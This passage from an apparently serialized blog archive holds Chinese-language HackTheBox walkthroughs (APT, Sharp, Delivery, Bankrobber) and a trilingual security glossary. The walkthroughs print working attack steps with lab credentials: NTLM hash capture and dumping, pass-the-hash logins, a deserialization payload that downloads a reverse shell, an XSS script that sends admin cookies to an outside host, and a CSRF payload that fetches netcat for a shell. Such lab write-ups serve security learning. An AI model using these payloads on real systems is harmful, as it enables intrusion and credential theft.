&#123;Set-ItemProperty -Path &quot;HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa&quot; lmcompatibilitylevel -Type DWORD -Value 2 -Force&#125; https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level 我们可以考虑使用Responder捕获LM hash, 让目标尝试连接回我们即可 Responder 这里利用了服务器上的Defender,让它扫描我们的smb，从而得到LM hash： 1234567891011121314# 需要先把responder的challenge改一下sudo nano /etc/responder/Responder.confChallenge = 1122334455667788sudo responder --lm -I tun0# targetcd \"\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2010.7-0\".\\MpCmdRun.exe -Scan -ScanType 3 -File \\\\10.10.14.11\\file.exe[+] Listening for events...[SMB] NTLMv1 Client : 10.10.10.213[SMB] NTLMv1 Username : HTB\\APT$[SMB] NTLMv1 Hash : APT$::HTB:D9FEC898E6C35AE11603F54A3E6CE2FCBA2287AD24479D46:D9FEC898E6C35AE11603F54A3E6CE2FCBA2287AD24479D46:2e28655a4a45f2f9 hash crack需要手动设置challenge后的hash，前面随机challenge的话就改配置再跑一遍： 1APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788 直接在线提交破解： https://crack.sh/get-cracking/ 123NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384Key: d167c3238864b12f5f82feae86a7f798 secretsdump然后就是使用得到的key组合出新hash(前半部分意味着无密码)，使用这个hash去dump secrets： 123aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798 'apt.htb/APT$@Apt.htb.local' secrets1234567891011121314151617181920212223Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::[*] Kerberos keys grabbedAdministrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413Administrator:des-cbc-md5:0816d9d052239b8akrbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bbkrbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799bkrbtgt:des-cbc-md5:f8c26238c2d976bfhenry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9afhenry.vinson:des-cbc-md5:73b6f71cae264fadhenry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165bhenry.vinson_adm:des-cbc-md5:5df8682c8c07a179APT$:aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454APT$:aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9APT$:des-cbc-md5:76c45245f104a4bf 预期，RoguePotato HackTheBox - APT - YouTubehttps://www.youtube.com/watch?v=eRnqtXwCZVs&amp;t=5730s&amp;ab_channel=IppSec 看ippsec的视频，defnder是非预期，预期解应该是修改RoguePotato支持ipv6,bypass defender root flag 直接使用Administrator hash连接，得到root.txt: 1evil-winrm -i apt.htb -u Administrator -H c370bddf384a691d811ff3495e8a72e2 参考资料 https://github.com/mubix/IOXIDResolver https://github.com/ropnop/kerbrute https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level https://crack.sh/get-cracking/ || APT - Detailed Writeup || | RaidForumshttps://raidforums.com/Thread-Free-Flag-APT-Detailed-Writeup HackTheBox - APT - YouTubehttps://www.youtube.com/watch?v=eRnqtXwCZVs&amp;t=5730s&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Sharp - HackTheBox","slug":"Sharp-HackTheBox","date":"2021-01-13T02:02:49.000Z","updated":"2021-05-06T00:46:10.213Z","comments":true,"path":"2021/01/13/Sharp-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/01/13/Sharp-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/303 10.10.10.219 端口扫描windows的一些常规端口： 123456789101112131415$ nmap -Pn -p- 10.10.10.219Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-13 08:36 CSTNmap scan report for 10.10.10.219Host is up (0.070s latency).Not shown: 65529 filtered portsPORT STATE SERVICE135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-ds5985/tcp open wsman8888/tcp open sun-answerbook8889/tcp open ddi-tcp-2Nmap done: 1 IP address (1 host up) scanned in 2734.15 seconds SMB enumsmb发现一个kanban可读： kanbankanban里面是一些文件： 可以下载下来分析： 1smbget -R smb://10.10.10.219/kanban kanban filespasswords可以用ack来搜索strings，比原生strings高效： 1234sudo apt-get install ack# -i忽略大小写ack -i \"password\" 整理得到的信息,密码加密的，加密方式可能是exe里定义的(其实就是des，可以自己解，也可以直接用exe功能得到明文)： 1234567AdministratorID: e8e29158d70d44b1a1ba4949d52790a0Encrypted Password: &quot;k+iUoOvQYG98PuhhRC7&#x2F;rg&#x3D;&#x3D;&quot;LarsID: 0628ae1de5234b81ae65c246dd2b4a21Encrypted Password: &quot;Ua3LyPFM175GN8D3+tqwLA&#x3D;&#x3D;&quot; user guide得到的还有user guide的pdf，这个需要看一下了解逻辑(26页英文的，我直接翻译wp了)： 1234567891011121314page 1: As the program is &#39;portable&#39;, it&#39;s at our mercy if we change config files程序是portable的，可以随意修改配置文件page 3: Blank passwords shouldn&#39;t be used - which says to me, it CAN be used but isn&#39;t advised不应该使用空密码，只是建议并非强制pages 11: There is the only one default user: “Administrator”with blank password.默认用户Administrator密码为空page 18: suggests that if you forget your password, just take the portable .exe to a different directory and try to execute it as Admin?如果忘记密码，可以把exe复制到其他目录以管理员权限执行pp 22: &quot;Passwords are hidden by default in Setup&#x2F;Users tab.&quot;Setup&#x2F;Users tab中默认隐藏用户密码 所以操作最好准备一台wndows虚拟机，Administrator权限 (没装windows，后面会用一些wp里的图，主要是理解流程) PortableKanban当运行exe，会有个弹框提示从pk3.bak文件恢复数据： 直接尝试Administrator空密码登录失败 修改配置因为是从pk3.bak恢复数据，我们直接查看这个文件，就是json格式，如果我们把Administrator的EncryptedPassword修改为空，我们就能够以空密码登录Administrator： Lars password根据前面的文档，Setup/Users tab隐藏了用户的密码，去对应的tab取消hide，得到另一个用户Lars的明文密码： 1Lars : G123HHrth234gRG Administrator password配置文件里也有用户角色定义，那可以直接复制一份新的，把Lars修改成Admin，登录进去得到Administrator明文密码： 1Administrator ： G2@$btRSHJYTarg SMB enum againcreds已有的两组账号密码可以组合去测试前面的smb，得到新的有效账号： 123#users;passwordsadministrator ; &quot;G123HHrth234gRG&quot;lars ; &quot;G2@$btRSHJYTarg&quot; 得到新的有效账户是lars用的administrator密码组合： 1sudo crackmapexec smb 10.10.10.219 -u usernames.txt -p passwords.txt enum 使用心得账号密码访问smb，多出来一个dev： 1smbmap -u lars -p G123HHrth234gRG -H 10.10.10.219 devdev也同样下载下来分析： 1smbget -R smb://10.10.10.219/dev/ -U lars%G123HHrth234gRG dev exe根据notes或者简单的分析，exe是.net的，那就直接反编译康康： https://github.com/dnSpy/dnSpy client.exeRemotingSample里有debug账号密码，8888端口前面也能看到是开放的： 1debug : SharpApplicationDebugUserPassword123! ExploitRemotingService根据相关信息，搜索发现相关漏洞利用，建议使用编译好的exe，自己编译坑太多了： tyranid/ExploitRemotingService: A tool to exploit .NET Remoting Serviceshttps://github.com/tyranid/ExploitRemotingService parteeksingh005/ExploitRemotingService_Compiledhttps://github.com/parteeksingh005/ExploitRemotingService_Compiled exploit利用部分就必须自己用windows机器做了，主要就是Yososerial生成reverse shell的序列化数据，然后ExploitRemotingService打过去触发反序列化，得到lars用户的reverse shell： https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 https://github.com/pwntester/ysoserial.net/releases/download/v1.34/ysoserial-1.34.zip 在文件最后加一句调用，然后自己启动服务，监听端口 123456789# add to ps1 fileInvoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 4445python -m SimpleHTTPServer 7777rlwrap nc -lvvp 4445ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c &quot;powershell -c IEX(new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;10.10.14.10:7777&#x2F;InvokePowerShellTcp.ps1&#39;)&quot;ExploitRemotingService.exe -s --user&#x3D;debug --pass&#x3D;&quot;SharpApplicationDebugUserPassword123!&quot; tcp:&#x2F;&#x2F;10.10.10.219:8888&#x2F;SecretSharpDebugApplicationEndpoint raw [payload] 有报错没什么影响，可以看到注入的powershell执行了，我们收到有http请求： lars shell &amp;&amp; user flag反序列化打到lars用户的reverse shell，读取user.txt: WCFlars用户Documents里有个wcf目录: 文件传输因为我们能够访问dev目录，可以把wcf压缩后移到dev然后下载： 12Compress-Archive -LiteralPath C:\\users\\lars\\Documents\\wcf -DestinationPath C:\\users\\lars\\Documents\\wcf.zipmove-item -path C:\\users\\lars\\Documents\\wcf.zip -destination c:\\dev wcf projectwcf应该也是个VS项目，可以用VS打开slh文件查看代码逻辑(没装VS，用wp的图了，后面还是要装VS。。。): 可以看到 Client main里还定义了一个8889端口,这个可能是特权用户运行的： modify &amp;&amp; build后续利用还是要自己windows机器做，VS里添加恶意代码，build会生成新的WcfRemotingLibrary.dll和WcfClient.exe，然后传上去替换： 12345Console.WriteLine(client.InvokePowerShell(&quot; iex (new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;10.10.14.10:7777&#x2F;InvokePowerShellTcp.ps1&#39;)&quot;));# 也可以直接添加用户，然后evil-winrm连接(测试添加用户成功但连不上，不知道什么原因)Console.WriteLine(client.InvokePowerShell(@&quot;net user miao miao123456 &#x2F;ADD&quot;));Console.WriteLine(client.InvokePowerShell(@&quot;net localgroup Administrators miao&quot;)); 添加用户成功但连接提示认证问题，可能是密码复杂度问题，还是常规reverse shell吧： 文件传输然后就是把生成的新文件传回去： 12certutil -urlcache -split -f \"http://10.10.14.10:7777/WcfRemotingLibrary.dll\" WcfRemotingLibrary.dllcertutil -urlcache -split -f \"http://10.10.14.10:7777/WcfClient.exe\" WcfClient.exe exploit &amp;&amp; root flag然后直接运行传上去的WcfClient.exe，里面的恶意代码会以特权用户执行，得到system shell，读取root.txt(这个打到的shell很容易断，需要快速操作，或者直接在这个shell的基础上再加载一个shell比较稳定): 参考资料 https://github.com/dnSpy/dnSpy tyranid/ExploitRemotingService: A tool to exploit .NET Remoting Serviceshttps://github.com/tyranid/ExploitRemotingService parteeksingh005/ExploitRemotingService_Compiledhttps://github.com/parteeksingh005/ExploitRemotingService_Compiled https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 https://raw.githubusercontent.com/Purp1eW0lf/HackTheBoxWriteups/master/Active%20Machines/Sharp.pdf NTLM Hash: 9e2ede4a0c81d4ca7630ef1e8d30afb7","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Delivery - HackTheBox","slug":"Delivery-HackTheBox","date":"2021-01-11T06:33:19.000Z","updated":"2021-05-24T00:56:12.599Z","comments":true,"path":"2021/01/11/Delivery-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/01/11/Delivery-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/308 10.10.10.222 端口扫描22和80： 123456789101112131415161718$ nmap -sC -sV 10.10.10.222Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-11 13:35 CSTNmap scan report for 10.10.10.222Host is up (0.069s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey:| 2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)| 256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)|_ 256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)80/tcp open http nginx 1.14.2|_http-server-header: nginx/1.14.2|_http-title: WelcomeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 30.31 seconds 80一个普通的web，页面信息能够得到子域名，contact里可以得到8065端口： 那就把已知信息加hosts： 110.10.10.222 helpdesk.delivery.htb delivery.htb 8065一个什么系统，需要登录，可以注册： 随意注册提示需要验证，但自己的邮箱并没有收到，应该是需要某种方式获取它分配的邮箱： helpdesk转去helpdesk，就是常规的helpdesk系统： new ticket创建一个ticket，得到一个邮箱地址和ticket id： check ticket statusCheck status就是进入分配给我们的邮箱的收件箱： 8065 create account然后去8065使用这个邮箱创建账号： get verify email之后去收件箱查看新邮件： 可以看到验证信息： verify email直接新开一个标签页复制粘贴访问验证链接，验证成功，登录： internal进入internal，跳过教程： 这里其实是后面的提示信息，上面那一行是一组用户名密码： 1234@developers Please update theme to the OSTicket before we go live. Credentials to the server are maildeliverer:Youve_G0t_Mail! 10:30 PMAlso please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of &quot;PleaseSubscribe!&quot; user flag然后直接ssh连接，得到user.txt: 1maildeliverer:Youve_G0t_Mail! 提权信息/opt/mattermost/config目录里是配置信息，里面有mysql连接信息： 1mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)&#x2F;mattermost?charset&#x3D;utf8mb4,utf8\\u0026readTimeout&#x3D;30s\\u0026writeTimeout&#x3D;30s mysqlmysql里查看数据，得到root密码hash： 123456789mysql -u mmuser -p&#39;Crack_The_MM_Admin_PW&#39; mattermostshow databases;use mattermost;show tables;select * from Users;select Password from Users where Username &#x3D; &#39;root&#39;;$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO config.json123456789101112131415...\"SqlSettings\": &#123; \"DriverName\": \"mysql\", \"DataSource\": \"mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\\u0026readTimeout=30s\\u0026writeTimeout=30s\", \"DataSourceReplicas\": [], \"DataSourceSearchReplicas\": [], \"MaxIdleConns\": 20, \"ConnMaxLifetimeMilliseconds\": 3600000, \"MaxOpenConns\": 300, \"Trace\": false, \"AtRestEncryptKey\": \"n5uax3d4f919obtsp1pw1k5xetq1enez\", \"QueryTimeout\": 30, \"DisableDatabaseSearch\": false &#125;,... hash crack这个hash直接常规方式跑不出来的，根据前面的提示信息，PleaseSubscribe! 不在rockyou里，需要根据提示生成新字典： OneRuleToRuleThemAll12345git clone https://github.com/stealthsploit/Optimised-hashcat-Rule.gitcd Optimised-hashcat-Rule/# root权限echo \"PleaseSubscribe!\" | hashcat -r OneRuleToRuleThemAll.rule --stdout &gt; wordlist.txt 然后使用生成的新字典可以破解出来密码： 123sudo john -w&#x3D;.&#x2F;wordlist.txt hash.txtPleaseSubscribe!21 root flag然后直接使用得到的密码切换到root，读取root.txt: 参考资料 https://github.com/stealthsploit/Optimised-hashcat-Rule Hackthebox Delivery writeup | 0xDedinfosechttps://0xdedinfosec.github.io/posts/htb-delivery/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"セキュリティ用語","slug":"セキュリティ用語","date":"2020-12-31T05:07:20.000Z","updated":"2021-04-26T08:21:33.748Z","comments":true,"path":"2020/12/31/セキュリティ用語/","link":"","permalink":"https://darkwing.moe/2020/12/31/%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E7%94%A8%E8%AA%9E/","excerpt":"","text":"专业单词对照表，参考了一些技术博客和 セキュリティ用語事典 - ＠IThttps://www.atmarkit.co.jp/ait/subtop/features/kwd/security_glossary.html 日本語 English 中文 デシリアライゼーション Deserialization 反序列化 シリアライゼーション Serialization 序列化 安全(あんぜん)でないデシリアライゼーション Insecure Deserialization 不安全的反序列化 脆弱性(ぜいじゃくせい) Vulnerability 漏洞 入力(にゅうりょく) Input 输入 出力(しゅつりょく) Output 输出 情報(じょうほう) information 信息 ブログ blog 博客 ハッキング Hacking 黑客活动 データ data 数据 バイナリ binary 二进制 サービス service 服务 システム system 系统 エンコード encode 编码 デコード decode 解码 文字列(もじれつ) string 字符串 署名(しょめい) signature 签名 暗号化(あんごうか) encryption 加密 復号化(ふくごうか) decryption 解密 ソーシャルログイン Social login 社交登录 仕様策定(しようさくてい) Specification development 制定规范 ユーザー user 用户 パスワード password 密码 ユースケース Use Case 用例 セキュリティ Security 安全 トークン Token サーバー server 服务端 クライアント client 客户端 ログイン login 登录 ログアウト logout 登出 登録(とうろく) register 注册 アプリケーション Application 应用 セッション session 会话 発行者(はっこうしゃ) sender 发送者 受信者(じゅしんしゃ) receiver 接收者 ブラウザ browser 浏览器 ハッシュ hash 哈希 アクセス access 访问 リクエスト request 请求 レスポンス response 响应 サイズ size 大小 ライブラリ library 库 プロトコル protocol 协议 フォーマット format 格式 ステートレス stateless 无状态的 アルゴリズム algorithm 算法 パラメータ parameter 参数 タグ tag 标签 ドキュメント document 文档 コンテキスト context 上下文 関数(かんすう) function 函数 公開鍵(こうかいかぎ) Public key 公钥 秘密鍵(ひみつかぎ) Private key 私钥 楕円曲線暗号(だえんきょくせんあんごう) Elliptic Curve Cryptography 椭圆曲线密码 ファイル file 文件 デバッガ debugger 调试器 リソース resource 资源 文字化け(もじばけ) garbled 乱码 オンライン online 在线 オフライン offline 离线 オンサイト on-site 现场 配信(はっしん) Delivery 发布/传送(信息) エンジニア engineer 工程师 インフラ Infra 基础设施 ペネトレーションテスト/侵入(しんにゅう)テスト/ペンテスト Penetration test/pentest 渗透测试 ポート port 端口 ディレクトリ directory 目录 スキャン scan 扫描 メモリ memory 内存 読み取り(読み取り) reading 读取 ツール tool 工具 ログ log 日志 ゲートウェイ gateway 网关 改ざん(かいざん) Falsification 篡改/伪造 共通鍵暗号方式(きょうつうかぎあんごうほうしき) common key cryptosystem 对称加密方式 公開鍵暗号方式(こうかいかぎあんごうほうしき) Public-key cryptosystem 公钥/非对称加密方式 クラッカー Cracker 破解者/恶意黑客 クロスサイトスクリプティング Cross Site Scripting 跨站脚本/XSS クロスサイトリクエストフォージェリ Cross site request forgery 跨站请求伪造/CSRF 公開鍵証明書(こうかいかぎしょうめいしょ) Public key certificate 公钥证书 コンテンツフィルタリング Content filtering 内容过滤 サイバーテロ cyber-terrorism 网络恐怖主义 サイバー犯罪(はんざい) Cyber crime 网络犯罪 アドミニストレータ administrator 管理员 冗長化(じょうちょうか) redundantize 冗余化 冗長性(じょうちょうせい) redundancy 冗余性 二重化(にじゅうか) duplication 备份/副本 ショルダーハック shoulder hack 窥视(从后面过肩) シングルサインオン Single Sign-On(SSO) 单点登录 スクリプトキディ Script kiddie 脚本小子 スニファ Sniffer 嗅探器 セキュリティホール Security hole 安全漏洞(用”脆弱性”的比较多吧) スパイウェア Spyware 间谍软件 スパム spam 垃圾邮件 セキュリティポリシー Security policy 安全策略 ソーシャルエンジニアリング Social engineering 社会工程学 トロイの木馬(もくば) Trojan horse 特洛伊木马 電子署名(でんししょめい) electronic signature 电子签名 なりすまし Spoofing 欺骗 ラボ lab 实验室 バイオメトリクス認証(にんしょう)/生体認証(せいたいにんしょう) biometric identification 生物认证 パケットフィルタリング Packet filtering 包过滤 ハッカー hacker 黑客 バックアップ backup 备份 バックドア Back Door 后门 バッファオーバーフロー Buffer overflow 缓冲区溢出 ハニーポット Honey pot 蜜罐 ファイアウォール Firewall 防火墙 フィッシング phishing 钓鱼攻击 フットプリンティング Foot printing 足迹(渗透前的信息搜集) 踏み台(ふみだい) Springboard 跳板 ブルートフォースアタック/総当たり攻撃(そうあたりこうげき) Brute Force Attack 蛮力攻击/暴力破解 プロキシ Proxy 代理 ポートスキャン port scan 端口扫描 マクロウイルス Macro virus 宏病毒 リバースエンジニアリング reverse engineering 逆向工程 ワーム worm 蠕虫 ワンタイムパスワード one-time password 一次性密码/OTP バージョン version 版本 ベータ beta 测试(版本) 公式(こうしき)ページ Official page 官网 リリース release 发布 サポート support 支持 アップデート update 更新 ライセンス license 许可证 フォレンジック forensic 取证(内存镜像之类的) コピー copy 复制 ファームウェア firmware 固件 ストレッチング stretching 对密码进行多次哈希操作 ペッパー pepper hash使用的胡椒(秘密字符串) ソルト salt hash使用的盐(随机字符串) 平文(ひらぶん) Plaintext 明文/纯文本 権限(けんげん) privilege 权限 レッドチーム RedTeam 红队(攻击队) ブルーチーム BlueTeam 蓝队(防守队) マルウェア malware 恶意软件 サブドメイン sub domain 子域名 エクスプロイト exploit (漏洞)利用 イメージ image 镜像 難読化(なんどくか) Obfuscation (代码)混淆 ペイロード payload 有效载荷 ブラインド blind 盲(指无回显) テンプレート template 模板 エンジン engine 引擎 リモートコード実行(じっこう) Remote code execution 远程代码执行/RCE フレームワーク Framework 框架 ステガノグラフィ steganography 隐写术 資格(しかく)/認証(にんしょう) qualification/certification 资质/认证 テキスト text 教科书/文本 回線(かいせん) circuit/line 线路(一般指网络) ピボッティング Pivoting 横向移动(渗透场景) ラテラルムーブメント Lateral movement 横向移动 ドメインコントローラサーバ Domain controller server 域控服务器 ストレージ storage 存储(硬盘空间) リッスン listen 监听 クラッキング cracking 破解 コマンド command 命令 プロセス process 进程 オプション option 选项 カンファレンス conference 会议 バグバウンティ Bug bounty 漏洞赏金之类的 CTFコンテスト CTF Contest CTF 比赛 インジェクション injection 注入 ファイルレス fileless 无文件(内存加载) ランサムウェア Ransomware 勒索软件 機械語(きかいご) Machine code/language 机器语言 アーキテクチャ architecture 架构(x86/x64/ARM) アセンブリ言語(げんご) assembly language 汇编语言 バックエンド back end 后端 フロントエンド front end 前端 添付(てんぷ)ファイル Attachment 附件 拡張子(かくちょうし) filename extension 文件扩展名 コピペ(コピー＆ペースト) copy and paste 复制粘贴 クレデンシャル Credentials 凭据 パストラバーサル Path Traversal 路径遍历 ポートフォワーディング port forwarding 端口转发","categories":[],"tags":[]},{"title":"Bankrobber - HackTheBox","slug":"Bankrobber-HackTheBox","date":"2020-12-29T07:02:48.000Z","updated":"2020-12-29T07:05:29.012Z","comments":true,"path":"2020/12/29/Bankrobber-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/12/29/Bankrobber-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/209 10.10.10.154 端口扫描80,443,445,3306: 1234567891011121314151617181920212223242526272829303132333435363738$ nmap -sC -sV 10.10.10.154Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 13:21 CSTNmap scan report for 10.10.10.154Host is up (0.068s latency).Not shown: 996 filtered portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4|_http-title: E-coin443/tcp open ssl/http Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4|_http-title: E-coin| ssl-cert: Subject: commonName=localhost| Not valid before: 2009-11-10T23:48:47|_Not valid after: 2019-11-08T23:48:47|_ssl-date: TLS randomness does not represent time| tls-alpn:|_ http/1.1445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)3306/tcp open mysql MariaDB (unauthorized)Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 59m59s, deviation: 0s, median: 59m59s| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode:| 2.02:|_ Message signing enabled but not required| smb2-time:| date: 2020-12-29T06:23:01|_ start_date: 2020-12-29T06:06:37Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 99.34 seconds 80/443一个比特币交易所： Web随意注册账号登录，有初始余额，可以转账操作,测试转账会提示Admin会查看审核： XSS因为提示管理员会查看，那就在comment那里尝试XSS，确认存在，并且可以发现admin路径，cookie中就是用户名密码的base64，那就直接xss打管理员cookie(XSS bot很不稳定，如果收不到请求就注销重新登录重试)： 1&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;10.10.14.15:7777&#x2F;cookie.js&quot;&gt;&lt;&#x2F;script&gt; 打到管理员cookie，解码得到admin密码： 123username&#x3D;YWRtaW4&#x3D;; password&#x3D;SG9wZWxlc3Nyb21hbnRpYw&#x3D;&#x3D;; id&#x3D;1admin : Hopelessromantic admin然后登录admin账号，现在我们是admin： admin顶部有一些链接，查看内容 notes.txtnotes提示这是xampp，现在还是默认目录；对localhost没有编码 123- Move all files from the default Xampp folder: TODO- Encode comments for every IP address except localhost: Done- Take a break.. backdoorchecker页面还有个backdoorchecker功能，提示只能使用dir，输入dir后提示只能localhost请求： cookie.js123var request = new XMLHttpRequest();request.open('GET', 'http://10.10.14.15:7777/?cookies='+document.cookie, true);request.send(); SQL注入admin页面还有个用户搜索功能，很基础的sql注入： 判断列数，3列，直接回显1，2: load_filemysql有load_file可以读文件，结合前面的信息xampp默认路径，可以去读源码(这里已经可以直接去读user.txt了)： 11&#39;union+select+1,load_file(&#39;c:\\\\xampp\\\\htdocs\\\\admin\\\\backdoorchecker.php&#39;),3;--+- 根据代码逻辑，我们可以通过XSS构造admin localhost的请求，使其执行任意命令 backdoorchecker.php123456789101112131415161718192021222324252627282930313233343536&lt;?phpinclude('../link.php');include('auth.php');$username = base64_decode(urldecode($_COOKIE['username']));$password = base64_decode(urldecode($_COOKIE['password']));$bad = array('$(','&amp;');$good = \"ls\";if(strtolower(substr(PHP_OS,0,3)) == \"win\")&#123; $good = \"dir\";&#125;if($username == \"admin\" &amp;&amp; $password == \"Hopelessromantic\")&#123; if(isset($_POST['cmd']))&#123; // FILTER ESCAPE CHARS foreach($bad as $char)&#123; if(strpos($_POST['cmd'],$char) !== false)&#123; die(\"You're not allowed to do that.\"); &#125; &#125; // CHECK IF THE FIRST 2 CHARS ARE LS if(substr($_POST['cmd'], 0,strlen($good)) != $good)&#123; die(\"It's only allowed to use the $good command\"); &#125; if($_SERVER['REMOTE_ADDR'] == \"::1\")&#123; system($_POST['cmd']); &#125; else&#123; echo \"It's only allowed to access this function from localhost (::1).&lt;br&gt; This is due to the recent hack attempts on our server.\"; &#125; &#125;&#125; else&#123; echo \"You are not allowed to use this function!\";&#125;?&gt; XSS + XSRF = Shell然后就是修改xss代码，让管理员执行命令，reverse shell： shell.js12345var request = new XMLHttpRequest();var params = 'cmd=dir|powershell -c \"iwr -uri 10.10.14.15:7777/nc64.exe -outfile %temp%\\\\n.exe\"; %temp%\\\\n.exe -e cmd.exe 10.10.14.15 4445';request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');request.send(params); user flag然后直接用户桌面得到user.txt: 提权信息C盘根目录有个bankv2.exe，当前用户没有权限: 查看端口和进程发现bankv2.exe运行在本地的910端口,可以把端口转发出来： 123456# local./chisel_1.7.0-rc7_darwin_amd64 server -p 8000 --reverse# targetpowershell -c \"wget 10.10.14.15:7777/chisel.exe -o c.exe\"c.exe client 10.10.14.15:8000 R:910:localhost:910 然后测试连接本机910端口，提示需要4位pin码： netstat -ano | findstr LISTENING12345678910111213141516171819202122232425netstat -ano | findstr LISTENING TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 3364 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 732 TCP 0.0.0.0:443 0.0.0.0:0 LISTENING 3364 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:910 0.0.0.0:0 LISTENING 1572 TCP 0.0.0.0:3306 0.0.0.0:0 LISTENING 3388 TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 444 TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 892 TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING 876 TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING 1340 TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING 576 TCP 0.0.0.0:49669 0.0.0.0:0 LISTENING 584 TCP 10.10.10.154:139 0.0.0.0:0 LISTENING 4 